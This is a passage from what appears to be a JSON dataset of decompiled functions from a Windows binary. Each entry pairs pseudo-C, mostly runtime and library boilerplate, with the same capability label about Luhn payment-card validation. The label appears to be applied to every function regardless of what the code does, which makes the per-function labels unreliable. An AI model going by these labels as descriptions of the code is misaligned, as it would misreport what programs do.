            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401028(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405dfd(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 327
    },
    "0040102d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040102d(ulong param_1, uint param_2)\n\n{\n    fcn.0040594d(param_1, param_1 >> 0x20, param_2);\n    return;\n}\n",
        "token_count": 50
    },
    "0040105f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040105f(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.0040592a(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 225
    },
    "00401073": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401073(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00404ce1(arg_10h * 2 + arg_8h, arg_18h, arg_14h);\n    *(arg_8h + (arg_10h + arg_14h) * 2) = 0;\n    return;\n}\n",
        "token_count": 129
    },
    "0040108c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040108c(void)\n\n{\n    uint var_4h;\n    \n    return 0x546711;\n}\n",
        "token_count": 29
    },
    "00401091": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00401091(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402a72(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "004010b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004010b9(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401af5();\n    fcn.00401730();\n    return param_1;\n}\n",
        "token_count": 56
    },
    "004010e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010e1(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b02();\n    return 0x1361d;\n}\n",
        "token_count": 45
    },
    "004010e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010e6(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    return arg_8h;\n}\n",
        "token_count": 38
    },
    "00401113": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401113(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00404d90(in_ECX + 4, arg_8h + 4);\n    return -iVar1 & 0xffffff00U | 1 - (iVar1 != 0);\n}\n",
        "token_count": 86
    },
    "00401131": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401131(uint arg_8h, code *arg_ch)\n\n{\n    code *arg_8h_00;\n    code **in_ECX;\n    \n    *in_ECX = vtable.pcharNode.0;\n    arg_8h_00 = fcn.0040528b(arg_ch);\n    in_ECX[1] = arg_8h_00;\n    in_ECX[2] = arg_ch;\n    if (arg_8h_00 == NULL) {\n        in_ECX[2] = NULL;\n    }\n    else {\n        fcn.00493859(arg_8h_00, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0040114f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040114f(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (7 < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.004059ac(puVar1, arg_8h, arg_ch * 2);\n        *(arg_ch * 2 + puVar1) = 0;\n    }\n    else {\n        fcn.004042aa(arg_ch, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00401181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401181(int32_t *param_1)\n\n{\n    char cVar1;\n    uint var_4h;\n    \n    cVar1 = (**(*param_1 + 0xc))();\n    return cVar1;\n}\n",
        "token_count": 58
    },
    "0040119f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040119f(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = arg_ch[1];\n    iVar2 = *arg_ch + arg_8h;\n    if (-1 < iVar1) {\n        iVar2 = iVar2 + *(*(iVar1 + arg_8h) + arg_ch[2]) + iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 110
    },
    "004011d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004011d6(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        fcn.00404a52(arg_ch, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004059ac(in_ECX + iVar1 * 2, arg_8h, arg_ch * 2);\n        *(in_ECX + (iVar1 + arg_ch) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0040123a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040123a(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00401654(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 49
    },
    "00401244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401244(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00402ca2(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 228
    },
    "0040128a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040128a(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    \n    if (arg_10h != 0) {\n        arg_8h = arg_8h - arg_ch;\n        do {\n            uVar1 = *(arg_8h + arg_ch);\n            if (uVar1 != *arg_ch) {\n                return (-(uVar1 < *arg_ch) & 0xfffffffe) + 1;\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 169
    },
    "004012df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004012df(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 31
    },
    "0040130c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040130c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = arg_8h & 0x80000003;\n    bVar2 = uVar1 == 0;\n    if (uVar1 < 0) {\n        bVar2 = (uVar1 - 1 | 0xfffffffc) == 0xffffffff;\n    }\n    if (bVar2) {\n        uVar1 = arg_8h / 100;\n        if (arg_8h % 100 != 0) goto code_r0x004bcd9e;\n    }\n    uVar1 = (arg_8h + 0x76c) / 400;\n    if ((arg_8h + 0x76c) % 400 != 0) {\n        return uVar1 & 0xffffff00;\n    }\ncode_r0x004bcd9e:\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "0040137f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040137f(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 4);\n}\n",
        "token_count": 38
    },
    "00401389": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00401389(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040638e(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "004013f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013f7(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 42
    },
    "0040146f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040146f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00403189(arg_8h, arg_10h, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 64
    },
    "00401474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401474(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint uStack40;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &uStack40;\n    var_14h = 0x426ec0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    uStack40 = arg_8h;\n    uVar1 = fcn.004062e9();\n    *in_FS_OFFSET = var_18h;\n    return uVar1;\n}\n",
        "token_count": 174
    },
    "00401537": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401537(uint arg_8h)\n\n{\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00403b02(0x1f6);\n    return 0x54f7;\n}\n",
        "token_count": 69
    },
    "004015aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015aa(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402342(arg_8h);\n    fcn.00406122(arg_8h_00);\n    return;\n}\n",
        "token_count": 71
    },
    "004015fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.004015fa(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        arg_8h_00 = fcn.00402522(arg_8h, &arg_ch, &var_310h);\n        fcn.00403cc4(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.004030bc(var_310h);\n    return;\n}\n",
        "token_count": 287
    },
    "00401622": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401622(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    fcn.004013cf(arg_8h, &var_10h, 0, &var_8h, 0);\n    return arg_8h;\n}\n",
        "token_count": 116
    },
    "00401654": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401654(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x426ea0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if (0xfff < arg_ch) {\n        var_10h = 0;\n        fcn.0040411a(&arg_8h, &arg_ch);\n    }\n    fcn.00401a2d(arg_8h);\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 177
    },
    "00401672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401672(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x574428);\n    return;\n}\n",
        "token_count": 48
    },
    "004016a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016a4(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00493c3a(3, \"FlsSetValue\", 0x555f20, 0x555f28);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(arg_8h, arg_ch);\n    }\n    else {\n        (**0x578000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004016bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016bd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = param_1 + 0x3c;\n    iVar2 = **(param_1 + 0xc);\n    if (iVar2 != iVar1) {\n        *(param_1 + 0x50) = iVar2;\n        *(param_1 + 0x54) = **(param_1 + 0x2c) + **(param_1 + 0x1c);\n    }\n    **(param_1 + 0xc) = iVar1;\n    **(param_1 + 0x1c) = iVar1;\n    **(param_1 + 0x2c) = 1;\n    return;\n}\n",
        "token_count": 178
    },
    "004016e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016e0(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 46
    },
    "004016f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016f9(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004ca267(4, \"FlsFree\", 0x5595f8, 0x559600);\n    if (pcVar1 != NULL) {\n        (**0x578000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004ca6e6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsFree)();\n    return;\n}\n",
        "token_count": 144
    },
    "00401721": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401721(uint arg_8h, uint arg_ch)\n\n{\n    uint *arg_ch_00;\n    uint *puVar1;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    \n    arg_ch_00 = fcn.0040528b(8);\n    if (arg_ch_00 == NULL) {\n        arg_ch_00 = NULL;\n    }\n    else {\n        *arg_ch_00 = 0;\n        arg_ch_00[1] = 0;\n    }\n    fcn.00404c8c(arg_8h, arg_ch_00);\n    fcn.00401622(&var_8h);\n    fcn.0040330f(&var_10h, 0x20);\n    puVar1 = fcn.004053b7(&var_18h, arg_ch);\n    *arg_ch_00 = *puVar1;\n    arg_ch_00[1] = puVar1[1];\n    return arg_8h;\n}\n",
        "token_count": 229
    },
    "00401730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401730(int32_t param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004067c1();\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 76
    },
    "0040173a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040173a(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040213f(arg_8h, arg_8h + 0x34, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "0040173f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040173f(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404cc3(in_ECX);\n    uVar2 = fcn.00406131(arg_8h);\n    fcn.00405830(uVar1, uVar2, 0x18);\n    return;\n}\n",
        "token_count": 112
    },
    "00401771": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401771(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x00489021. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 87
    },
    "0040178a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040178a(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "004017c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004017c1(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x14);\n}\n",
        "token_count": 40
    },
    "0040180c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040180c(void)\n\n{\n    uint var_4h;\n    \n    return 0x227e;\n}\n",
        "token_count": 29
    },
    "00401816": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401816(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.00402a59(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 224
    },
    "00401825": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401825(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0xc));\n    fcn.00404179(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 70
    },
    "0040185c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040185c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406924();\n    if (iVar1 == 0) {\n        return 0x571e60;\n    }\n    return iVar1 + 0x14;\n}\n",
        "token_count": 65
    },
    "004018b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018b1(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004ca267(6, \"FlsSetValue\", 0x559610, 0x559618);\n    if (pcVar1 != NULL) {\n        (**0x578000)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004ca785. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)();\n    return;\n}\n",
        "token_count": 147
    },
    "004018c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.004018c5(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        arg_8h_00 = fcn.00401799(arg_8h, &arg_ch, &var_310h);\n        fcn.00403cc4(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.004030bc(var_310h);\n    return;\n}\n",
        "token_count": 288
    },
    "004018ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004018ed(uint noname_0, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401744(arg_ch);\n    fcn.00401730();\n    return in_ECX;\n}\n",
        "token_count": 67
    },
    "00401906": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401906(uint *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    for (; cVar1 = **0x574458,  cVar1 != '\\0'; *0x574458 = *0x574458 + 1) {\n        if (cVar1 == '@') {\n            puVar5 = fcn.004064ab(&var_8h);\n            uVar2 = puVar5[1];\n            *arg_8h = *puVar5;\n            arg_8h[1] = uVar2;\n            *(arg_8h + 2) = 1;\n            return;\n        }\n        if (0xf < cVar1 + 0xbfU) break;\n        uVar3 = var_8h >> 0x1c;\n        uVar4 = cVar1 - 0x41;\n        uVar6 = var_8h * 0x10;\n        var_8h = uVar6 + uVar4;\n        var_4h = (var_4h << 4 | uVar3) + (uVar4 >> 0x1f) + CARRY4(uVar6, uVar4);\n    }\n    *(arg_8h + 2) = 0;\n    return;\n}\n",
        "token_count": 356
    },
    "00401929": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401929(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 31
    },
    "00401933": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401933(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004d3ef1(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 64
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401960(void)\n\n{\n    uint var_4h;\n    \n    return 0x546718;\n}\n",
        "token_count": 28
    },
    "0040199c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040199c(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x20);\n}\n",
        "token_count": 40
    },
    "00401a05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401a05(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 32
    },
    "00401a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a3c(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x574428);\n    return;\n}\n",
        "token_count": 49
    },
    "00401a46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
